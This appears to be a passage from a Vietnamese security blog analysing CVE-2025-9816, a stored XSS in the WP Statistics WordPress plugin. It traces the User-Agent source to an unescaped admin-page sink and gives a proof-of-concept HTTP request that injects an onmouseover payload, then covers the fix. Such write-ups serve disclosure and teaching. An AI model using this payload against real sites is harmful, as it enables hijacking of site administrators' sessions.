    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p><strong>Source:</strong> <code>User-Agent</code> header (POST <code>/wp-json/wp-statistics/v2/hit</code>) — DeviceDetector parse → <code>getModel()</code>.
<strong>Sink:</strong> <code>includes/admin/templates/pages/devices/models.php</code> — <code>echo $item-&gt;model</code> (không <code>esc_html()</code> / <code>esc_attr()</code>)</p>
<h3 class="heading-element" id="flow"><span>Flow</span>
  <a href="#flow" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><ol>
<li>Attacker gửi UA chứa payload XSS trong model</li>
<li>Model chứa payload được lưu trong database</li>
<li>Admin mở tab models =&gt; payload chạy.</li>
</ol>
<h2 class="heading-element" id="exploit"><span>Exploit</span>
  <a href="#exploit" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><h3 class="heading-element" id="proof-of-concept-poc"><span>Proof of Concept (PoC)</span>
  <a href="#proof-of-concept-poc" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><ul>
<li>Gửi request chứa XSS payload:</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/wp-json/wp-statistics/v2/hit</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">localhost</span>
</span></span><span class="line"><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Linux; Android 14; Goly &#34;onmouseover=alert()-&#34; Build) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.0.0 Mobile Safari/537.36</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="g">wp_statistics_hit=1&amp;source_type=home&amp;source_id=0&amp;search_query=&amp;signature=787b07b8979cb982ec89a4f103a68081&amp;endpoint=hit&amp;referred=&amp;page_uri=Lw%3D%3D</span></span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>Admin truy cập endpoint và hover vào model chứa payload:</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/wp-admin/admin.php?page=wps_devices_page&amp;tab=models</span></span></code></pre></td></tr></table>
</div>
</div><figure><img src="/posts/2025-10-08-cve-2025-9816/result.png"
    alt="Result — PoC execution screenshot"><figcaption>
      <p>Result — PoC execution screenshot</p>
    </figcaption>
</figure>

<blockquote>
<p>Dùng <code>&quot;</code> để đóng title, tạo alert() thông qua sự kiện <strong>onmouseover</strong> vì đây là thẻ <code>&lt;span&gt;</code>, <code>-</code> đùng để nối chuỗi trong JavaScript tránh được lỗi cú pháp</p>
</blockquote>
<h2 class="heading-element" id="conclusion"><span>Conclusion</span>
  <a href="#conclusion" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>Lỗ hổng <strong>CVE-2025-9816</strong> trong plugin <strong>WP Statistics &lt;= 14.15.4</strong> cho phép <strong>Stored XSS</strong> thông qua giá trị <code>model</code> lấy từ header <code>User-Agent</code>. Payload được lưu vào DB và hiển thị trong trang quản trị <strong>Device Models</strong> mà không escape đúng cách. Bản vá <strong>14.15.5</strong> đã thêm <code>esc_html()</code>/<code>esc_attr()</code> khi in ra HTML.</p>
<p><strong>Key takeaways</strong>:</p>
<ul>
<li><strong>Stored XSS</strong> nguy hiểm hơn reflected vì tồn tại lâu dài trong DB.</li>
<li>Dữ liệu đến từ <strong>HTTP headers</strong> cũng cần được coi như input không tin cậy.</li>
<li>Luôn <strong>escape khi output</strong> thay vì chỉ sanitize khi input.</li>
<li><strong>Update plugin</strong> lên bản mới nhất để ngăn chặn khai thác.</li>
</ul>
<h2 class="heading-element" id="references"><span>References</span>
  <a href="#references" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p><a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet"target="_blank" rel="external nofollow noopener noreferrer">Cross-site scripting (XSS) cheat sheet - PortSwigger</a></p>
<p><a href="https://patchstack.com/database/wordpress/plugin/wp-statistics/vulnerability/wordpress-wp-statistics-plugin-14-5-4-unauthenticated-stored-cross-site-scripting-via-user-agent-header-vulnerability"target="_blank" rel="external nofollow noopener noreferrer">WordPress WP Statistics &lt;= 14.15.4 - CVE-2025-9816</a></p></div><hr class="awesome-hr" />
    <h2 id="see-also">Nội dung liên quan</h2>
    <ul><li>
          <a href="/vi/posts/2025-10-10-cve-2025-5062/" title="CVE-2025-5062 Analysis &amp; POC">CVE-2025-5062 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-11-06-cve-2025-10647/" title="CVE-2025-10647 Analysis &amp; POC">CVE-2025-10647 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-11-04-cve-2025-62065/" title="CVE-2025-62065 Analysis &amp; POC">CVE-2025-62065 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-11-03-cve-2025-2940/" title="CVE-2025-2940 Analysis &amp; POC">CVE-2025-2940 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-11-02-cve-2025-1043/" title="CVE-2025-1043 Analysis &amp; POC">CVE-2025-1043 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-11-01-cve-2025-52713/" title="CVE-2025-52713 Analysis &amp; POC">CVE-2025-52713 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-10-31-cve-2025-60161/" title="CVE-2025-60161 Analysis &amp; POC">CVE-2025-60161 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-10-30-cve-2025-11128/" title="CVE-2025-11128 Analysis &amp; POC">CVE-2025-11128 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-10-28-cve-2025-6851/" title="CVE-2025-6851 Analysis &amp; POC">CVE-2025-6851 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-10-09-cve-2024-4439/" title="CVE-2024-4439 Analysis &amp; POC">CVE-2024-4439 Analysis &amp; POC</a></li></ul><div class="post-footer" id="post-footer">
  <div class="post-info">
    <div class="post-info-line">
      <div class="post-info-mod"><span title="Cập nhật ngày 2025-10-27 01:40:34">Cập nhật ngày 2025-10-27&nbsp;<a class="git-hash" href="https://github.com/w41bu1/w41bu1.github.io/commit/9adcfc8a6a2e794d74d7a68cbdb1d508a51dfe07" rel="external nofollow noopener noreferrer" target="_blank" title="Basic update&#10&#10Commit: 9adcfc8a6a2e794d74d7a68cbdb1d508a51dfe07 [9adcfc8]&#10Author: w41bu1&#10Date: 2025-10-27 01:40:34"><i class="fa-solid fa-hashtag fa-fw" aria-hidden="true"></i>9adcfc8</a></span>
      </div><div class="post-info-license">
            <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a></span>
          </div></div><div class="post-info-line">
        <div class="post-info-md"><span><a href="/vi/posts/2025-10-08-cve-2025-9816/index.md" title="Đọc với định dạng Markdown" class="link-to-markdown">Đọc với định dạng Markdown</a></span><span><a href="https://github.com/w41bu1/w41bu1.github.io/blob/main/content/posts/2025-10-08-CVE-2025-9816/index.vi.md?plain=1" title="Xem mã nguồn"target="_blank" rel="external nofollow noopener noreferrer" class="link-to-source">Xem mã nguồn</a></span><span><a href="https://github.com/w41bu1/w41bu1.github.io/edit/main/content/posts/2025-10-08-CVE-2025-9816/index.vi.md" title="Chỉnh sửa trang này"target="_blank" rel="external nofollow noopener noreferrer" class="link-to-edit">Chỉnh sửa trang này</a></span><span><a href="https://github.com/w41bu1/w41bu1.github.io/issues/new?title=[BUG]%20CVE-2025-9816&#43;Analysis&#43;%26&#43;POC&amp;body=%7cField%7cValue%7c%0A%7c-%7c-%7c%0A%7cTitle%7cCVE-2025-9816&#43;Analysis&#43;%26&#43;POC%7c%0A%7cURL%7chttp://localhost:1313/vi/posts/2025-10-08-cve-2025-9816/%7c%0A%7cFilename%7chttps://github.com/w41bu1/w41bu1.github.io/blob/main/content/posts/2025-10-08-CVE-2025-9816/index.vi.md?plain=1%7c" title="Báo cáo lỗi"target="_blank" rel="external nofollow noopener noreferrer" class="link-to-report">Báo cáo lỗi</a></span><span><a href="vscode://file//home/w41bu1/Desktop/w41bu1.github.io/content/posts/2025-10-08-CVE-2025-9816/index.vi.md" title="Mở trong trình chỉnh sửa"target="_blank" rel="external nofollow noopener noreferrer" class="link-to-vscode">Mở trong trình chỉnh sửa</a></span></div>
        <div class="post-info-share">
          <span><a href="javascript:void(0);" title="Chia sẻ trên X" data-sharer="twitter" data-url="http://localhost:1313/vi/posts/2025-10-08-cve-2025-9816/" data-title="CVE-2025-9816 Analysis &amp; POC" data-hashtags="analyst,plugin,xss"><i class="fa-brands fa-x-twitter fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="Chia sẻ trên Facebook" data-sharer="facebook" data-url="http://localhost:1313/vi/posts/2025-10-08-cve-2025-9816/" data-hashtag="analyst"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="Chia sẻ trên Linkedin" data-sharer="linkedin" data-url="http://localhost:1313/vi/posts/2025-10-08-cve-2025-9816/"><i class="fa-brands fa-linkedin fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="Chia sẻ trên Hacker News" data-sharer="hackernews" data-url="http://localhost:1313/vi/posts/2025-10-08-cve-2025-9816/" data-title="CVE-2025-9816 Analysis &amp; POC"><i class="fa-brands fa-hacker-news fa-fw" aria-hidden="true"></i></a>
  </span>
        </div>
      </div></div>

  <div class="post-info-more">
    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/vi/tags/analyst/" class="post-tag" title="Nhãn - Analyst">Analyst</a><a href="/vi/tags/plugin/" class="post-tag" title="Nhãn - Plugin">Plugin</a><a href="/vi/tags/xss/" class="post-tag" title="Nhãn - Xss">Xss</a></section>
    <section><span><a href="javascript:void(0);" onclick="window.history.back();">Quay lại</a></span>&nbsp;|&nbsp;<span><a href="/vi/">Trang chủ</a></span>
    </section>
  </div><div class="post-nav"><a href="/vi/posts/2025-10-07-cve-2025-6832/" class="post-nav-item" rel="prev" title="CVE-2025-6832 Analysis &amp; POC"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>CVE-2025-6832 Analysis &amp; POC</a><a href="/vi/posts/2025-10-09-cve-2024-4439/" class="post-nav-item" rel="next" title="CVE-2024-4439 Analysis &amp; POC">CVE-2024-4439 Analysis &amp; POC<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article>

  <aside class="toc" id="toc-auto" aria-label="Nội dung"><h2 class="toc-title">Nội dung&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
      <div class="toc-content always-active" id="toc-content-auto"></div></aside></main><footer class="footer">
    <div class="footer-container"><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
            <span itemprop="copyrightYear">2025</span><span class="author" itemprop="copyrightHolder">
              <a href="github.com/w41bu1">Bui Van Y</a></span><span class="license footer-divider">w41bu1</span></div><div class="footer-line statistics"></div><div class="footer-line visitor">
          <span id="busuanzi_container_site_uv" title='Tổng khách truy cập'><i class="fa-regular fa-user fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='Tổng lượt truy cập'><i class="fa-regular fa-eye fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
        </div><div class="footer-line beian"><span class="gov"><i class="fa-solid fa-user-secret"></i></span><span class="icp footer-divider"><i class="fa-solid fa-bug"></i></span></div></div>
  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Lên trên"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
        </div></div><div id="mask"></div><noscript>
    <div class="noscript-warning">Trang web này hoạt động tốt nhất khi JavaScript được kích hoạt.</div>
  </noscript>
</div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/lightgallery/lightgallery.min.js" defer></script><script src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js" defer></script><script src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js" defer></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/cell-watermark/watermark.min.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script src="/vi/posts/2025-10-08-cve-2025-9816/config/page.js" defer></script><script src="/js/theme.min.js" defer></script><script src="/js/flyfish.min.js" defer></script></body>
</html>
